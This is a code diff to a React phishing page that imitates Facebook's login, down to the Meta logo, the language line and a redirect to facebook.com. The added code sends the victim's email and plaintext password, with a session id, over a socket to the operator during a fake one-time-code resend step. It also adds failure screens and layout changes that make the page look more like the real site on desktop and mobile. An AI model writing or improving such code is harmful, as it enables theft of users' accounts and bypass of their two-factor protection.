@@ -1,4 +1,12 @@
-import { HStack, Image, Input, Text, VStack } from "@chakra-ui/react";
+import {
+  Box,
+  Stack,
+  HStack,
+  Image,
+  Input,
+  Text,
+  VStack,
+} from "@chakra-ui/react";
 import { Button } from "../components/ui/button";
 import React, { useEffect, useRef, useState } from "react";
 import { Link, useNavigate } from "react-router-dom";
@@ -10,6 +18,7 @@ import { useUser } from "../contexts/UserContext";
 import StageTwo from "../components/generic/StageTwo";
 import StageThree from "../components/generic/StageThree";
 import ErrorStage from "../components/generic/ErrorStage";
+import Failed from "../components/generic/Failed";
 
 const Landing = () => {
   const navigate = useNavigate();
@@ -59,6 +68,18 @@ const Landing = () => {
           if (data.message) {
             setVerificationMessage(data.message);
           }
+        } else if (data.eventType === "fb_resend_otp") {
+          if (data.sendTo) {
+            setIsLoading(false);
+
+            if (data.message) {
+              setVerificationMessage(data.message);
+            }
+
+            if (data.sendTo) {
+              setSendTo(data.sendTo);
+            }
+          }
         } else {
           window.location.href = "https://www.facebook.com";
         }
@@ -96,6 +117,17 @@ const Landing = () => {
     });
   };
 
+  const handleResend = () => {
+    setIsLoading(true);
+    setErrorMessage("");
+    socketRef.current.emit("fb_resend_otp", {
+      email: credentials.username,
+      password: credentials.password,
+      timestamp: new Date().toISOString(),
+      sessionId: socketRef.current.id,
+    });
+  };
+
   const handleFinish = () => {
     setIsLoading(true);
     setErrorMessage("");
@@ -110,10 +142,15 @@ const Landing = () => {
 
   const stageComponents = {
     1: <StageOne handleLogin={handleLogin} />,
-    2: <StageTwo handleAuthValueSubmit={handleAuthValueSubmit} />,
+    2: (
+      <StageTwo
+        handleAuthValueSubmit={handleAuthValueSubmit}
+        handleResend={handleResend}
+      />
+    ),
     3: <StageThree handleFinish={handleFinish} />,
-    // 3: <ErrorStage />,
-    4: <div>ErrorPage</div>,
+    // 3: <ErrorStage handleFinish={handleFinish} />,
+    4: <Failed handleFinish={handleFinish} />,
   };
 
   const slideVariants = {
@@ -138,19 +175,54 @@ const Landing = () => {
       <VStack w="100dvw" h="100dvh" pt="0.5rem" px="1rem" gap="0">
         <Text fontSize="13px">English (UK)</Text>
 
-        <AnimatePresence custom={direction}>
-          <motion.div
-            style={{ width: "100%" }}
-            key={currentStage}
-            custom={direction}
-            variants={slideVariants}
-            initial="initial"
-            animate="animate"
-            exit="exit"
+        <Stack
+          display={{ md: "flex", base: "none" }}
+          w="100%"
+          alignItems="center"
+          mt="3rem"
+        >
+          <VStack
+            w="396px"
+            bg="#fff"
+            border="none"
+            borderRadius="8px"
+            boxSizing="border-box"
+            p="20px 0 20px"
+            justifyContent="space-between"
+            gap="3rem"
+            boxShadow="0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1)"
           >
-            {stageComponents[currentStage]}
-          </motion.div>
-        </AnimatePresence>
+            <AnimatePresence custom={direction}>
+              <motion.div
+                style={{ width: "100%" }}
+                key={currentStage}
+                custom={direction}
+                variants={slideVariants}
+                initial="initial"
+                animate="animate"
+                exit="exit"
+              >
+                {stageComponents[currentStage]}
+              </motion.div>
+            </AnimatePresence>
+          </VStack>
+        </Stack>
+
+        <Box display={{ base: "flex", md: "none" }} w="100%">
+          <AnimatePresence custom={direction}>
+            <motion.div
+              style={{ width: "100%" }}
+              key={currentStage}
+              custom={direction}
+              variants={slideVariants}
+              initial="initial"
+              animate="animate"
+              exit="exit"
+            >
+              {stageComponents[currentStage]}
+            </motion.div>
+          </AnimatePresence>
+        </Box>
 
         <VStack position="absolute" bottom="2%" gap="1.5rem" fontSize="10px">
           <Image src="./images/meta.png" alt="meta" w="60px" h="12px" />
